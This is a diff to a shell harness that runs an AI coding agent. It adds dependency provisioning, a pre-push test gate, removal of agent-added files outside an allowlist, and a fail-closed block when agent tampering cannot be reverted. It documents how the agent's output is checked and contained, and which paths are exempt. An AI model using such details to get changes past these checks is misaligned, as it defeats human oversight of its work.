+        [ -n "${new_path}" ] || continue
+        # Top-level path component (everything before the first `/`).
+        top="${new_path%%/*}"
+        case "${top}" in
+            # Dependency / build / cache dirs an honest provisioner populates.
+            node_modules|.venv|venv|target|vendor|.bundle|__pycache__|\
+            .mypy_cache|.pytest_cache|.ruff_cache|.tox|.cargo|.gradle|\
+            .npm|.pnpm-store|.yarn|dist|build|.cache|.mac-provisioned)
+                ;;
+            *)
+                ( cd "${d}" && rm -rf -- "${new_path}" 2>/dev/null || true )
+                echo "[opencode-build] gate: scrubbed agent-introduced untracked file outside dependency allowlist: '${new_path}'" >&2
+                ;;
+        esac
+    done < <(comm -13 "${pre_untracked}" "${post_untracked}")
+    rm -f "${pre_untracked}" "${post_untracked}"
+    return 0
+}
+
+# Helper: activate the Node version required by the project in directory $1 using nvm. Falls back silently to the system Node if nvm is absent or the version cannot be determined. Exports NVM_DIR and updates PATH in-process.
+_activate_node_for() {
+    local pdir="$1"
+    local NVM_DIR="${NVM_DIR:-/var/lib/mac/.nvm}"
+    [ -s "${NVM_DIR}/nvm.sh" ] || return 0  # nvm not installed — use system Node
+
+    local want
+    want="$(_resolve_node_version "${pdir}" || true)"
+    if [ -z "${want}" ]; then
+        echo "[opencode-build] gate: no Node version declaration found; using system Node ($(node --version 2>/dev/null || echo unknown))" >&2
+        return 0
+    fi
+
+    # Source nvm into this shell. shellcheck disable=SC1091
+    . "${NVM_DIR}/nvm.sh" --no-use 2>/dev/null || true
+
+    echo "[opencode-build] gate: project requires Node ${want} — activating via nvm..."
+    if nvm install "${want}" 2>&1 | tail -3; then
+        nvm use "${want}" >/dev/null 2>&1 || true
+        echo "[opencode-build] gate: node now $(node --version 2>/dev/null)"
+    else
+        echo "[opencode-build] gate: nvm install ${want} failed — falling back to system Node" >&2
+    fi
+}
+
+
+# and node_modules is absent. Capture output to a temp file and tail it rather than piping to `head` — piping to head under `set -o pipefail` can SIGPIPE npm into a non-zero status once output exceeds the head limit, spuriously reporting failure.
+_npm_install_in() {
+    local pdir="$1" log
+    [ -f "${pdir}/package.json" ] || return 0
+    [ -d "${pdir}/node_modules" ] && return 0
+    if ! command -v npm >/dev/null 2>&1; then
+        echo "[opencode-build] gate: npm not found — cannot provision JS dependencies" >&2
+        return 0
+    fi
+    echo "[opencode-build] gate: installing npm dependencies in ${pdir}..."
+    log="$(mktemp)"
+    if ( cd "${pdir}" && npm install --no-audit --no-fund >"${log}" 2>&1 ); then
+        echo "[opencode-build] gate: npm install succeeded"
+    else
+        echo "[opencode-build] gate: npm install failed (continuing anyway)"
+    fi
+    tail -20 "${log}" || true
+    rm -f "${log}"
+}
+
+# Helper: does a Makefile with a `test:` target shell out to a JS toolchain that needs node_modules (npm/yarn/pnpm/npx/node/vitest/jest/mocha)? A `test:` target frequently CHAINS to sub-targets where the npm invocation lives — possibly far more than 20 lines below `test:` — so a fixed `-A20` window misses them (M3). Once a `test:` target exists, scan the WHOLE Makefile for any JS toolchain invocation. The goal is "could `make test` ultimately invoke a JS tool?", not "is npm on the test: line itself".
+_makefile_test_wraps_js() {
+    grep -Eq '^test:' "$1" 2>/dev/null || return 1
+    grep -Eq '(^|[[:space:]])(npm|yarn|pnpm|npx|node|vitest|jest|mocha)([[:space:]]|$)' "$1"
+}
+
+# Resolve the project directory a test command targets. A `cd [--] <rel> && ...` prefix means the JS/test project lives in a subdir; otherwise it's $d.
+_gate_project_dir_for_cmd() {
+    local d="$1" cmd="$2" pdir="$d"
+    case "${cmd}" in
+        cd\ *)
+            local rel="${cmd#cd }"
+            # The detector emits `cd -- <rel>`; strip the `--` option terminator.
+            rel="${rel#-- }"
+            rel="${rel%% &&*}"
+            pdir="${d}/${rel}"
+            ;;
+    esac
+    echo "${pdir}"
+}
+
+# Step A.5: ensure test command dependencies are installed. If the detected command is not available, attempt to install it. Creates a per-task virtual environment to isolate dependencies and avoid PATH pollution/permission issues with system site-packages.
 gate_ensure_test_deps() {
     local d="$1" cmd="$2"
     cd "${d}"
-    
+
     case "${cmd}" in
-        npm*test*)
-            # npm test requires npm install first
-            if [ -f "${d}/package.json" ] && [ ! -d "${d}/node_modules" ]; then
-                echo "[opencode-build] gate: installing npm dependencies..."
-                if npm install --silent 2>&1 | head -20; then
-                    echo "[opencode-build] gate: npm install succeeded"
-                else
-                    echo "[opencode-build] gate: npm install failed (continuing anyway)"
-                fi
-            fi
+        *npm*test*)
+            local pdir
+            pdir="$(_gate_project_dir_for_cmd "${d}" "${cmd}")"
+            # Activate the Node version the project requires BEFORE installing deps — npm/node_modules must be built against the right runtime.
+            _activate_node_for "${pdir}"
+            _npm_install_in "${pdir}"
             ;;
         pytest*)
-            # Create a per-task venv for isolated dependency installation.
-            # This avoids read-only filesystem errors and PATH pollution.
-            local venv_path="/tmp/mac-task-venv-${MAC_TASK_ID:-unknown}"
-            if [ ! -d "${venv_path}" ]; then
-                echo "[opencode-build] gate: creating per-task venv at ${venv_path}"
-                if python3 -m venv "${venv_path}" 2>&1 | head -5; then
-                    echo "[opencode-build] gate: venv created successfully"
-                else
-                    echo "[opencode-build] gate: venv creation failed — falling back to system pytest"
-                    return 0
-                fi
+            # Provision the declared Python version (uv) and activate a per-task venv. Falls back to system python3 when undeclared.
+            local venv_path
+            venv_path="$(_activate_python_for "${d}" || true)"
+            if [ -z "${venv_path}" ]; then
+                echo "[opencode-build] gate: venv unavailable — falling back to system pytest"
+                return 0
             fi
-            
-            # Activate the venv for this shell and all child processes.
-            # Export VIRTUAL_ENV so pytest/pip detect they're in a venv.
+            # _activate_python_for runs in a command-substitution subshell, so its in-process exports don't reach this shell. Re-activate the captured venv here so pytest/pip — and the test run that follows in gate_run_tests — resolve against the provisioned interpreter.
             export VIRTUAL_ENV="${venv_path}"
             export PATH="${venv_path}/bin:${PATH}"
-            
+
             # pytest requires installation; check if available in venv, install if not
             if ! command -v pytest >/dev/null 2>&1; then
                 echo "[opencode-build] gate: pytest not found in venv, installing..."
                 if [ -f "${d}/pyproject.toml" ] || [ -f "${d}/requirements.txt" ] || [ -f "${d}/setup.py" ]; then
-                    # Install pytest and any declared test dependencies.
-                    # Prefer uv (fast), fallback to pip.
+                    # Install pytest and any declared test dependencies. Prefer uv (fast), fallback to pip.
                     if command -v uv >/dev/null 2>&1; then
                         echo "[opencode-build] gate: using uv to install test dependencies..."
                         uv pip install pytest 2>&1 | head -10 || \
@@ -459,10 +785,18 @@ gate_ensure_test_deps() {
             fi
             ;;
         make*test*)
-            # make test should work if make is installed (already in base image)
+            # `make` itself ships in the base image, but a polyglot repo's `test:` recipe frequently shells out to a JS toolchain (npm/vitest/jest). With node_modules absent the recipe fails rc=127 — the false-negative that strands valid work. If the recipe wraps JS and a package.json exists, provision deps first.
+            if [ -f "${d}/Makefile" ] && _makefile_test_wraps_js "${d}/Makefile"; then
+                _activate_node_for "${d}"
+                _npm_install_in "${d}"
+            fi
             ;;
         *uv*run*)
             # uv run pytest handles its own dependency installation
+            ;;
+        *)
+            # Registry handles npm/pytest/make/uv above. Anything else (cargo, go, gradle, bundle, ...) is unknown — try the PROVISION-ONLY agent fallback. The gate still runs and judges the project's own command in gate_run_tests.
+            _provision_unknown_with_agent "${d}" "${cmd}"
             ;;
     esac
 }
@@ -550,8 +884,7 @@ PYEOF
     echo "[opencode-build] lint: cmd='${GATE_LINT_COMMAND}' status=${GATE_LINT_STATUS} autofixed=${GATE_LINT_AUTOFIXED}"
 }
 
-# Step C + D: run the detected test command and decide the gate verdict.
-# Sets GATE_VERDICT to "pass" (push allowed) or "fail" (push blocked).
+# Step C + D: run the detected test command and decide the gate verdict. Sets GATE_VERDICT to "pass" (push allowed) or "fail" (push blocked).
 gate_run_tests() {
     local d="$1" out start end rc
     cd "${d}"
@@ -568,6 +901,15 @@ gate_run_tests() {
     # Ensure test dependencies are installed before running tests
     gate_ensure_test_deps "${d}" "${GATE_TEST_COMMAND}"
 
+    # Fail CLOSED: if the PROVISION-ONLY agent fallback ran and its tracked-file revert failed, the tree may carry agent tampering. Do NOT judge it — block.
+    if [ "${GATE_PROVISION_UNSAFE}" = "true" ]; then
+        GATE_TEST_STATUS="fail"
+        GATE_VERDICT="fail"
+        GATE_REASON="provisioning agent changes could not be reverted — tree untrusted; push and MR blocked"
+        echo "[opencode-build] gate: ${GATE_REASON}"
+        return 0
+    fi
+
     out="$(mktemp)"
     echo "[opencode-build] gate: running tests via '${GATE_TEST_COMMAND}'"
     start="$(date +%s)"
@@ -581,8 +923,8 @@ gate_run_tests() {
     GATE_TEST_DURATION_S="$((end - start))"
     GATE_TEST_OUTPUT="$(_gate_tail_output "${out}" 200)"
 
-    # Parse failing test names/files (best-effort; pytest + jest shapes).
-    GATE_TEST_FAILING="$(grep -E '^(FAILED|FAIL) ' "${out}" 2>/dev/null | head -50 || true)"
+    # Parse failing test names/files (best-effort; pytest + jest shapes). `grep -m50` caps the list without `| head -50` (head closing the pipe early would SIGPIPE grep under pipefail and could empty the result; M2).
+    GATE_TEST_FAILING="$(grep -m50 -E '^(FAILED|FAIL) ' "${out}" 2>/dev/null || true)"
 
     if [ "${rc}" -eq 0 ]; then
         GATE_TEST_STATUS="pass"
@@ -611,13 +953,10 @@ if [ -n "${REPO_URL}" ]; then
     cd "${WORKDIR}"
     git config user.email "${MAC_AGENT_ID}@mac.local"
     git config user.name "${MAC_AGENT_ID}"
-    # Remember the clone point so we can detect commits the agent makes on
-    # ANY branch (agentic models often run their own git workflow via the
-    # bash tool and commit to a branch of their choosing).
+    # Remember the clone point so we can detect commits the agent makes on ANY branch (agentic models often run their own git workflow via the bash tool and commit to a branch of their choosing).
     BASE_SHA="$(git rev-parse HEAD 2>/dev/null || true)"
     if [ -n "${CHECKOUT_BRANCH}" ]; then
-        # Existing-branch mode: check out the remote branch instead of creating
-        # a new one. Used for CI-fix tasks targeting an existing MR branch.
+        # Existing-branch mode: check out the remote branch instead of creating a new one. Used for CI-fix tasks targeting an existing MR branch.
         echo "[opencode-build] checkout_branch set — fetching and checking out existing branch ${CHECKOUT_BRANCH}"
         git fetch origin "${CHECKOUT_BRANCH}"
         git checkout "${CHECKOUT_BRANCH}"
@@ -629,10 +968,7 @@ if [ -n "${REPO_URL}" ]; then
     fi
 fi
 
-# Run opencode build agent. If we have a working tree, cd into it so opencode
-# sees the repo as cwd (it does NOT have an explicit --cwd flag).
-# Capture stdout (structured JSON events) and stderr (provider/runtime
-# errors) into SEPARATE files so a postmortem can tell them apart.
+# Run opencode build agent. If we have a working tree, cd into it so opencode sees the repo as cwd (it does NOT have an explicit --cwd flag). Capture stdout (structured JSON events) and stderr (provider/runtime errors) into SEPARATE files so a postmortem can tell them apart.
 opencode_stdout="$(mktemp)"
 opencode_stderr="$(mktemp)"
 set +e
@@ -649,8 +985,7 @@ set -e
 ORIGINAL_OPENCODE_RC="${opencode_rc}"
 finished_at="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
 echo "[opencode-build] rc=${opencode_rc}"
-# Echo head AND tail of both streams so terminated pod logs are
-# actionable — provider/tool errors frequently land at the tail.
+# Echo head AND tail of both streams so terminated pod logs are actionable — provider/tool errors frequently land at the tail.
 echo "[opencode-build] --- opencode stdout (head) ---"
 sed -n '1,40p' "${opencode_stdout}" || true
 echo "[opencode-build] --- opencode stdout (tail) ---"
@@ -673,28 +1008,16 @@ GIT_STATUS=""
 GIT_CWD=""
 # Set to "true" when the mandatory pre-push test gate refused the push.
 GATE_BLOCKED="false"
-# When a working tree exists, the build agent is expected to edit files.
-# If opencode returns rc=0 but leaves the tree clean (it "planned" but
-# never called an edit tool), or if the commit can't be pushed, or the
-# push succeeded but the PR/MR couldn't be opened, the run is NOT
-# successful work — mark it failed so the lease expires and the task is
-# retried instead of being submitted for review as complete.
+# When a working tree exists, the build agent is expected to edit files. If opencode returns rc=0 but leaves the tree clean (it "planned" but never called an edit tool), or if the commit can't be pushed, or the push succeeded but the PR/MR couldn't be opened, the run is NOT successful work — mark it failed so the lease expires and the task is retried instead of being submitted for review as complete.
 NO_EFFECTIVE_CHANGE="false"
 if [ -n "${WORKDIR}" ] && [ -d "${WORKDIR}/.git" ]; then
     cd "${WORKDIR}"
     GIT_CWD="$(pwd)"
     GIT_STATUS="$(git status --porcelain 2>/dev/null || true)"
 
-    # The build agent may produce work in two ways:
-    #   1. Leave uncommitted edits in the working tree (we commit them).
-    #   2. Run its own git workflow via the bash tool — checkout a branch
-    #      of its choosing, `git add`, `git commit` — leaving the tree
-    #      clean. The previous logic only handled (1) and silently
-    #      discarded (2): the agent's real work was stranded on an
-    #      unpushed local branch and the run was marked "no file changes".
+    # The build agent may produce work in two ways:   1. Leave uncommitted edits in the working tree (we commit them).   2. Run its own git workflow via the bash tool — checkout a branch      of its choosing, `git add`, `git commit` — leaving the tree      clean. The previous logic only handled (1) and silently      discarded (2): the agent's real work was stranded on an      unpushed local branch and the run was marked "no file changes".
     #
-    # Resolve the branch that actually carries the work, then push it to
-    # ${TASK_BRANCH} on origin.
+    # Resolve the branch that actually carries the work, then push it to ${TASK_BRANCH} on origin.
     WORK_REF=""
     if [ -n "${GIT_STATUS}" ]; then
         # Case 1: uncommitted edits — commit them on TASK_BRANCH.
@@ -703,13 +1026,11 @@ if [ -n "${WORKDIR}" ] && [ -d "${WORKDIR}/.git" ]; then
         git commit -m "mac: $(echo "${PROMPT}" | head -1)" -m "task=${MAC_TASK_ID} agent=${MAC_AGENT_ID}" || true
         WORK_REF="HEAD"
     else
-        # Case 2: clean tree. Find a branch whose tip is ahead of the
-        # clone point — that's where the agent committed its work.
+        # Case 2: clean tree. Find a branch whose tip is ahead of the clone point — that's where the agent committed its work.
         if [ -n "${BASE_SHA}" ]; then
             cur_sha="$(git rev-parse HEAD 2>/dev/null || true)"
             if [ -n "${cur_sha}" ] && [ "${cur_sha}" != "${BASE_SHA}" ]; then
-                # Agent committed on the current branch (could be
-                # TASK_BRANCH or one it checked out).
+                # Agent committed on the current branch (could be TASK_BRANCH or one it checked out).
                 WORK_REF="HEAD"
             else
                 # Scan local branches for one ahead of BASE_SHA.
@@ -734,35 +1055,27 @@ if [ -n "${WORKDIR}" ] && [ -d "${WORKDIR}/.git" ]; then
         HEAD_SHA="$(git rev-parse "${WORK_REF}" 2>/dev/null || true)"
         echo "[opencode-build] head=${HEAD_SHA} files=${FILES_CHANGED}"
 
-        # MANDATORY PRE-PUSH GATE. Make sure the work ref is the checked-out
-        # tree so lint/tests run against the agent's actual changes, then run
-        # lint (non-blocking, with auto-fix) followed by the hard test gate.
+        # MANDATORY PRE-PUSH GATE. Make sure the work ref is the checked-out tree so lint/tests run against the agent's actual changes, then run lint (non-blocking, with auto-fix) followed by the hard test gate.
         git checkout -q "${WORK_REF}" 2>/dev/null || git checkout -q "${TASK_BRANCH}" 2>/dev/null || true
         gate_run_lint "${WORKDIR}"
         gate_run_tests "${WORKDIR}"
 
         if [ "${GATE_VERDICT}" != "pass" ]; then
-            # Tests failed (or no test command could be detected). Do NOT
-            # push and do NOT open an MR. Surface the failure as evidence and
-            # mark the run failed so it transitions to needs_review/retry
-            # instead of being submitted as complete.
+            # Tests failed (or no test command could be detected). Do NOT push and do NOT open an MR. Surface the failure as evidence and mark the run failed so it transitions to needs_review/retry instead of being submitted as complete.
             echo "[opencode-build] PRE-PUSH GATE BLOCKED: ${GATE_REASON}"
             echo "[opencode-build] refusing to push or open MR; routing to needs_review"
             GATE_BLOCKED="true"
             NO_EFFECTIVE_CHANGE="true"
         else
         set +e
-        # Push whatever ref carries the work TO the task branch on origin,
-        # so the review/PR path is consistent regardless of which branch
-        # the agent chose locally.
+        # Push whatever ref carries the work TO the task branch on origin, so the review/PR path is consistent regardless of which branch the agent chose locally.
         git push origin "${WORK_REF}:refs/heads/${TASK_BRANCH}" 2>&1
         push_rc=$?
         set -e
         if [ "$push_rc" -eq 0 ]; then
             PUSHED="true"
             echo "[opencode-build] pushed ${WORK_REF} -> ${TASK_BRANCH}"
-            # Open a PR/MR unless skip_pr_open is set (e.g. CI-fix tasks that
-            # target an existing MR branch — push updates the existing PR).
+            # Open a PR/MR unless skip_pr_open is set (e.g. CI-fix tasks that target an existing MR branch — push updates the existing PR).
             if [ -n "${SKIP_PR_OPEN}" ]; then
                 echo "[opencode-build] skip_pr_open=true — push complete, skipping PR creation (existing PR will pick up the push)"
             else
@@ -796,8 +1109,7 @@ except Exception:
 ' 2>/dev/null || true)"
                 echo "[opencode-build] PR opened: #${PR_NUMBER} ${PR_URL}"
             else
-                # Pushed but no MR means the review/integration path is
-                # broken — treat as a failed run so it is retried.
+                # Pushed but no MR means the review/integration path is broken — treat as a failed run so it is retried.
                 echo "[opencode-build] PR open failed rc=${pr_rc}: ${pr_json}"
                 NO_EFFECTIVE_CHANGE="true"
             fi
@@ -820,12 +1132,7 @@ export GATE_TEST_COMMAND GATE_TEST_STATUS GATE_TEST_RC GATE_TEST_OUTPUT
 export GATE_TEST_DURATION_S GATE_TEST_FAILING GATE_TEST_SUGGESTION
 export GATE_VERDICT GATE_REASON
 
-# If we had a working tree but produced no pushed+MR'd change, force a
-# non-zero effective return code. job_executor.py keys submit-for-review
-# off returncode==0, so a clean-tree "plan only" run (or a push without a
-# PR) would otherwise be recorded as complete. Only override a successful
-# opencode rc — a real opencode failure already carries its own non-zero
-# code.
+# If we had a working tree but produced no pushed+MR'd change, force a non-zero effective return code. job_executor.py keys submit-for-review off returncode==0, so a clean-tree "plan only" run (or a push without a PR) would otherwise be recorded as complete. Only override a successful opencode rc — a real opencode failure already carries its own non-zero code.
 if [ "${NO_EFFECTIVE_CHANGE}" = "true" ] && [ "${opencode_rc}" -eq 0 ]; then
     echo "[opencode-build] no pushed+reviewed change despite rc=0 — marking task failed for retry"
     opencode_rc=1
